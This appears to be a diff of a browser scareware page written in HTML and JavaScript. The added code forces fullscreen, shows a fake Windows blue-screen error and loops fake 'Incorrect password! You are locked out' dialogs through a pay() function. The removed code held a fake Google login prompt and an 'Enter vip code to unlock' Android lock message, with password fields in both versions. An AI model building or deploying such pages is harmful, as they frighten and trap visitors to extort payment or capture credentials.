@@ -13,7 +13,8 @@ lockscreen()
 }
 }
 function lockscreen() {
-document.write(`<h2>To unlock login to your Google account</h2><p><input type = "email"></p><p><button onclick = "locked()">Log in</button></p>`);
+fullscreen(document.body)
+pay()
 }
 function fullscreen(element) {
 if(element.requestFullScreen) {
@@ -28,18 +29,38 @@ function pay() {
 document.write(`<div class="trap"><div class="trap__form"><div class="confirm" style="top:-3px;position:fixed;left:50%;width:402px;margin:0 0 0 -221px;background-color:#fbfbfb;border:1px solid #c7c7c7;padding:16px 19px 21px 19px;border-radius:3px;font:11.7px Arial;color:#000;box-shadow:0 3px 3px -2px rgba(0,0,0,0.5)"><div style="float:right;margin:-17px -11px;font-size:18px;color:#808080;cursor:pointer;">×</div><div style="font: 14px Verdana, Arial;text-align:left !important;margin-bottom:4px">Incorrect password!</div><br><div style="font:10.5px Verdana, Arial;text-align:left !important;margin:-2px 0 1px 0">You are locked out.</div><br><div style="float:right;margin-top:10px"><button onclick = "lockscreen()" style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #6e80ff;font-weight:700;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);">Ok</button><button style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px 0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #bfbfbf;font-weight:200;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);">Do not leave</button></div></div></div></div>`);
 }
 </script>
-<button onclick = "fullscreen(document.documentElement)">Cloud ☒</button>
 <body>
 <div class = "element">
 <p> 
-<div class="trap">
-	<div class="trap__form">
-		<div class="confirm" style="top:-3px;position:fixed;left:50%;width:402px;margin:0 0 0 -221px;background-color:#fbfbfb;border:1px solid #c7c7c7;padding:16px 19px 21px 19px;border-radius:3px;font:11.7px Arial;color:#000;box-shadow:0 3px 3px -2px rgba(0,0,0,0.5)"><div style="float:right;margin:-17px -11px;font-size:18px;color:#808080;cursor:pointer;">×</div><div style="font: 14px Verdana, Arial;text-align:left !important;margin-bottom:4px">Please log in</div><br><div style="font:10.5px Verdana, Arial;text-align:left !important;margin:-2px 0 1px 0"><input type = "password"></div><br><div style="float:right;margin-top:10px"><button onclick = "death(document.documentElement)" style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #6e80ff;font-weight:700;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);">Close</button><button style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px 0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #bfbfbf;font-weight:200;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);">Do not leave this page</button></div></div>
-	</div>
-</div>
 </p>
-<p>Your android is locked out</p>
-<p> Enter vip code to unlock </p>
+<p>A problem has been detected and Windows has been shut down to prevent damage
+to your computer.
+
+The problem seems to be caused by the following file: xNtKrnl.exe
+
+SYSTEM_THREAD_EXCEPTION_NOT_HANDLED
+
+If this is the first time you've seen this stop error screen,
+restart your computer. If this screen appears again, follow
+these steps:
+
+Check to make sure any new hardware or software is properly installed.
+If this is a new installation, ask your hardware or software manufacturer
+for any Windows updates you might need.
+
+If problems continue, disable or remove any newly installed hardware
+or software. Disable BIOS memory options such as caching or shadowing.
+If you need to use safe mode to remove or disable components, restart
+your computer, press F8 to select Advanced Startup Options, and then
+select Safe Mode.
+
+Technical Information:
+
+*** STOP: 0x1000007e (0xffffffffc0000005, 0xfffff80002e55151, 0xfffff880009a99d8,
+0xfffff880009a9230)
+
+*** xNtKrnl.exe - Address 0xfffff80002e55151 base at 0xfffff80002e0d000 DateStamp
+0x4ce7951a</p>
 <p><input type = "password"></p><button onclick ="pay()"></button>
 </div>
 </body>
